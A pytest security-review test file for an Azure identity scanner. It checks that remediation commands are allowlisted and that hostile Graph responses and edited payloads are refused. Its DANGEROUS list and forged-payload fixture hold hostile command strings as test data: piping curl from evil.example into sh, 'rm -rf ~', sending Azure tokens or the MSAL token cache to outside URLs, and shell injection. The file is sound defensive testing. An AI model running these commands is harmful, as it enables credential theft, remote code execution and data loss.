"""Attacks from every side the scanner has (security review of 26/11/2026).

The tenant writes names and descriptions; Graph, or whatever answers in its place, writes the responses; anyone can
edit a saved payload before it is rendered again with --from-json. None of them may make the scanner run, show or
send something it should not, hang, or stop without a message.
"""

import io
import json
import time
import types
from datetime import datetime, timedelta, timezone

import pytest
from pypdf import PdfReader
from rich.console import Console

from src.nhi_scanner import collector
from src.nhi_scanner.cli import main
from src.nhi_scanner.commands import BLOCKED, is_safe_live, safe_remediation
from src.nhi_scanner.demo import build_demo_snapshot, build_scale_snapshot
from src.nhi_scanner.engine import run_scan
from src.nhi_scanner.pdf_report import write_pdf_report
from src.nhi_scanner.report import render

NOW = datetime(2026, 11, 26, 12, 0, tzinfo=timezone.utc)


# --------------------------------------------------------------------------- #
# Remediation commands: an allowlist, checked again on every render
# --------------------------------------------------------------------------- #

DANGEROUS = [
    # az itself can leak: --resource makes az send a token to any --url, @file uploads a local file
    "az rest --method POST --url https://evil.example/x --resource https://management.azure.com",
    "az rest --method GET --url https://evil.example/x",
    "az rest --method GET --url https://graph.microsoft.com.evil.example/v1.0/me",
    "az rest --method GET --url https://user@graph.microsoft.com@evil.example/",
    "az rest --method GET --url http://graph.microsoft.com/v1.0/me",
    "az rest --method GET --url https://graph.microsoft.com:8443/v1.0/me",
    "az rest --method POST --url https://graph.microsoft.com/v1.0/x --body @~/.azure/msal_token_cache.json",
    "az rest --method POST --url https://graph.microsoft.com/v1.0/x --headers Authorization=x",
    "az rest --method GET --url https://graph.microsoft.com/v1.0/x --output-file ~/.bashrc",
    "az rest --method GET",
    "az account get-access-token",
    "az ad app update --id x > ~/.bashrc",
    "az ad app update --id x < /etc/passwd",
    "az ad app update --id x 2>~/.ssh/authorized_keys",
    "az ad app update --id $HOME",
    "az ad app update --id ${IFS}x",
    'az ad app update --id "$(id)"',
    'az ad app update --id "`id`"',
    "az ad app update --id x; curl https://evil.example | sh",
    "az ad app update --id x && rm -rf ~",
    "az ad app update --id 'x",
    "az ad app update --id x\\",
    "az ad app update --id *",
    "az ad app update --id x\x1b]8;;https://evil.example\x1b\\",
    "AZ ad app update --id x",
    "rm -rf ~",
]

PLAIN = [
    "az ad app credential delete --id 1b2c --key-id 3d4e",
    "az rest --method DELETE --url https://graph.microsoft.com/v1.0/x  # Mail.Send",
    "az rest --method POST --url 'https://graph.microsoft.com/v1.0/servicePrincipals/1/microsoft.graph.agentIdentity/"
    "sponsors/$ref' --body '{\"@odata.id\":\"https://graph.microsoft.com/v1.0/users/2\"}'",
    'az ad app owner add --id 1 --owner-object-id "<OWNER_OBJECT_ID>"',
    'az ad app credential reset --id 1 --append --cert "@<NEW_CERTIFICATE_FILE>"',
    'az role assignment create --assignee 1 --role Contributor --scope "<RESOURCE_GROUP_SCOPE>"',
]


@pytest.mark.parametrize("line", DANGEROUS)
def test_dangerous_commands_are_commented_out(line):
    out = safe_remediation(line)
    assert out.startswith(BLOCKED) and "\x1b" not in out


@pytest.mark.parametrize("line", PLAIN)
def test_the_commands_the_rules_write_still_pass(line):
    assert is_safe_live(line)


def test_every_command_of_a_large_tenant_passes_without_being_blocked():
    payload = run_scan(build_scale_snapshot(1500, now=NOW), now=NOW)
    lines = [ln for f in payload.findings for ln in f.remediation_cli.splitlines()]
    assert lines and not [ln for ln in lines if ln.startswith(BLOCKED)]


@pytest.fixture
def forged(tmp_path):
    """A saved payload someone edited: a token-stealing command and markup where names go."""
    data = json.loads(run_scan(build_demo_snapshot(NOW), now=NOW).model_dump_json())
    data["findings"][0]["remediation_cli"] = (
        "# Rotate the secret:\naz rest --method POST --url https://evil.example --resource https://management.azure.com")
    data["entities"][0]["display_name"] = '<img src="/etc/passwd"/><link href="https://evil.example">x</link>'
    path = tmp_path / "forged.json"
    path.write_text(json.dumps(data), encoding="utf-8")
    return path


def test_a_forged_payload_cannot_put_a_live_command_in_the_report(forged, tmp_path):
    pdf, out = tmp_path / "r.pdf", tmp_path / "again.json"
    assert main(["--from-json", str(forged), "--quiet", "--pdf", str(pdf), "--json", str(out)]) == 0
    text = " ".join(" ".join(p.extract_text() for p in PdfReader(str(pdf)).pages).split())
    assert "[blocked: unsafe value from the tenant]" in text
    again = json.loads(out.read_text(encoding="utf-8"))
    commands = [ln for f in again["findings"] for ln in f["remediation_cli"].splitlines()]
    assert not [ln for ln in commands if "evil.example" in ln and not ln.startswith("#")]


def test_a_forged_payload_cannot_embed_files_or_links_in_the_pdf(forged, tmp_path):
    pdf = tmp_path / "r.pdf"
    assert main(["--from-json", str(forged), "--quiet", "--pdf", str(pdf)]) == 0
    reader = PdfReader(str(pdf))
    assert sum(len(p.images) for p in reader.pages) == 0
    annots = [a.get_object() for p in reader.pages for a in (p.get("/Annots") or [])]
    assert "evil.example" not in str(annots)


def test_a_deeply_nested_payload_is_refused_with_a_message(tmp_path):
    meta = json.loads(run_scan(build_demo_snapshot(NOW), now=NOW).model_dump_json())["metadata"]
    bomb = tmp_path / "bomb.json"
    bomb.write_text('{"metadata":' + json.dumps(meta) + ',"entities":[{"raw_metadata":' + '{"a":' * 20000 + "1"
                    + "}" * 20000 + "}],\"findings\":[]}", encoding="utf-8")
    assert main(["--from-json", str(bomb), "--quiet"]) == 1


# --------------------------------------------------------------------------- #
# The transport: whatever answers in Graph's place
# --------------------------------------------------------------------------- #


class _Resp:
    def __init__(self, status=200, body=None, headers=None, raises=None):
        self.status_code, self._body, self.headers, self._raises = status, body, headers or {}, raises
        self.text = str(body)[:300]

    def json(self):
        if self._raises:
            raise self._raises
        return self._body


class _Cred:
    def get_token(self, *_a, **_k):
        return types.SimpleNamespace(token="secret-token", expires_on=10**12)


def _http(monkeypatch, answer):
    monkeypatch.setattr(collector.time, "sleep", lambda _s: None)
    seen = []

    def get(url, **kwargs):
        seen.append((url, kwargs))
        return answer(url)

    http = collector._Http(_Cred(), "scope", collector.GRAPH)
    http._session = types.SimpleNamespace(get=get)
    return http, seen


def test_a_next_link_that_repeats_stops_paging(monkeypatch):
    loop = collector.GRAPH + "/v1.0/applications?$skiptoken=same"
    http, seen = _http(monkeypatch, lambda url: _Resp(body={"value": [{"id": "1"}], "@odata.nextLink": loop}))
    with pytest.raises(collector.CollectionError, match="paging does not end"):
        list(http.paged("/v1.0/applications"))
    assert len(seen) == 2


def test_pages_that_never_end_stop_at_a_bound(monkeypatch):
    monkeypatch.setattr(collector, "MAX_PAGES", 50)
    count = iter(range(10**9))
    http, seen = _http(monkeypatch, lambda url: _Resp(body={
        "value": [], "@odata.nextLink": f"{collector.GRAPH}/v1.0/x?$skiptoken={next(count)}"}))
    with pytest.raises(collector.CollectionError, match="paging does not end"):
        list(http.paged("/v1.0/x"))
    assert len(seen) <= 52


def test_redirects_are_never_followed(monkeypatch):
    http, seen = _http(monkeypatch, lambda url: _Resp(status=302, body={}, headers={"Location": "https://evil.example"}))
    with pytest.raises(collector.CollectionError, match="302"):
        http.get("/v1.0/x")
    assert all(kw.get("allow_redirects") is False for _url, kw in seen)


@pytest.mark.parametrize("resp", [
    _Resp(raises=ValueError("<html>proxy error</html>")), _Resp(body=[1, 2]), _Resp(body="text"), _Resp(body=None),
])
def test_a_response_that_is_not_a_json_object_is_a_collection_error(monkeypatch, resp):
    http, _ = _http(monkeypatch, lambda url: resp)
    with pytest.raises(collector.CollectionError):
        http.get("/v1.0/x")


@pytest.mark.parametrize("value", ["text", [1, 2], [{"id": "1"}, "x"], {"id": "1"}])
def test_a_page_whose_value_is_not_a_list_of_objects_is_refused(monkeypatch, value):
    http, _ = _http(monkeypatch, lambda url: _Resp(body={"value": value}))
    with pytest.raises(collector.CollectionError, match="not a list of objects"):
        list(http.paged("/v1.0/x"))


@pytest.mark.parametrize("bad", ["../../me", "x?$select=a", "x#frag", "https://evil.example", "a/b", "", None, 7,
                                 "x" * 65])
def test_object_ids_from_responses_never_reshape_a_url(bad):
    with pytest.raises(collector.CollectionError):
        collector._seg(bad)


@pytest.mark.parametrize("path", ["/v1.0/users/../../beta/me", "/v1.0/a/%2e%2e/b", "/v1.0/a/%2E%2E/b", "/v1.0/./x"])
def test_dot_segments_are_refused_before_sending(path):
    with pytest.raises(collector.CollectionError, match="dot segments"):
        collector._Http(_Cred(), "scope", collector.GRAPH)._resolve(path)


@pytest.mark.parametrize("resource_id", [
    "/subscriptions/s/resourceGroups/rg/providers/Microsoft.ManagedIdentity/userAssignedIdentities/../../x",
    "/subscriptions/s/resourceGroups/rg/providers/Microsoft.KeyVault/vaults/kv",
    "https://evil.example/subscriptions/s",
    "/subscriptions/s/resourceGroups/rg/providers/Microsoft.ManagedIdentity/userAssignedIdentities/x?api-version=1",
])
def test_managed_identity_resource_ids_are_checked_before_use(resource_id):
    with pytest.raises(collector.CollectionError):
        collector._mi_path(resource_id)


def test_hostile_object_ids_cost_only_their_own_read(monkeypatch):
    """A sponsor list that cannot be read safely is unknown, and the scan goes on."""
    from test_collector import ROUTES, _backend

    routes = {**ROUTES, collector.AGENT_IDENTITIES: {"value": [
        {"@odata.type": "#microsoft.graph.agentIdentity", "id": "../../../me", "appId": "ag-x",
         "displayName": "odd", "servicePrincipalType": "ServiceIdentity", "owners": []}]}}
    _backend(monkeypatch, routes=routes)
    snap = collector.collect()
    assert any("not a plain identifier" in w for w in snap.warnings)
    assert run_scan(snap).metadata.tenant_id


# --------------------------------------------------------------------------- #
# The command line
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize("days", ["-5", "0", "3651", "999999999999"])
def test_dormancy_threshold_out_of_range_is_refused(days, tmp_path):
    assert main(["--demo", "--quiet", "--dormant-days", days, "--json", str(tmp_path / "s.json")]) == 1
    assert not (tmp_path / "s.json").exists()


# --------------------------------------------------------------------------- #
# Hostile shapes: the scan, the console and the PDF stay fast and finish
# --------------------------------------------------------------------------- #


def _ts(days):
    return (NOW + timedelta(days=days)).strftime("%Y-%m-%dT%H:%M:%SZ")


def _everything(snap, tmp_path, budget):
    started = time.perf_counter()
    payload = run_scan(snap, now=NOW)
    render(payload, Console(file=io.StringIO(), width=120), "x")
    write_pdf_report(payload, tmp_path / "r.pdf", "x")
    assert time.perf_counter() - started < budget
    return payload


def test_huge_strings_everywhere_still_give_a_report(tmp_path):
    snap = build_demo_snapshot(NOW)
    big = "A" * 200_000
    for obj in snap.applications + snap.service_principals:
        obj.update(displayName=obj["displayName"] + big, description=big, notes=big, tags=[big])
    for creds in snap.app_federated_credentials.values():
        for f in creds:
            f["subject"] = "repo:o/r:pull_request" + big
    _everything(snap, tmp_path, budget=30)


def test_thousands_of_items_on_one_identity_keep_the_report_short(tmp_path):
    snap = build_demo_snapshot(NOW)
    app = snap.applications[1]
    app["passwordCredentials"] = [{"keyId": f"k{i}", "displayName": f"s{i}", "startDateTime": _ts(-100),
                                   "endDateTime": _ts(i % 400 - 200)} for i in range(5000)]
    snap.app_federated_credentials[app["id"]] = [
        {"id": f"f{i}", "name": f"f{i}", "issuer": "https://token.actions.githubusercontent.com",
         "subject": f"repo:o/r{i}:pull_request", "audiences": ["api://AzureADTokenExchange"]} for i in range(5000)]
    sp = snap.service_principals[1]["id"]
    snap.azure_role_assignments += [{"id": f"/subscriptions/s/providers/Microsoft.Authorization/roleAssignments/{i}",
                                     "principalId": sp, "roleName": "Owner", "scope": f"/subscriptions/{i:08d}"}
                                    for i in range(5000)]
    _everything(snap, tmp_path, budget=30)
    assert len(PdfReader(str(tmp_path / "r.pdf")).pages) < 80


@pytest.mark.parametrize("value", ["not a date", "9999-99-99T99:99:99Z", "x" * 100_000, "2026-13-45T00:00:00Z"])
def test_a_malformed_date_reads_as_unknown_and_the_scan_goes_on(value, tmp_path):
    snap = build_demo_snapshot(NOW)
    snap.applications[1]["createdDateTime"] = value
    snap.applications[1]["passwordCredentials"] = [{"keyId": "k", "displayName": "s", "startDateTime": value,
                                                    "endDateTime": value}]
    _everything(snap, tmp_path, budget=30)
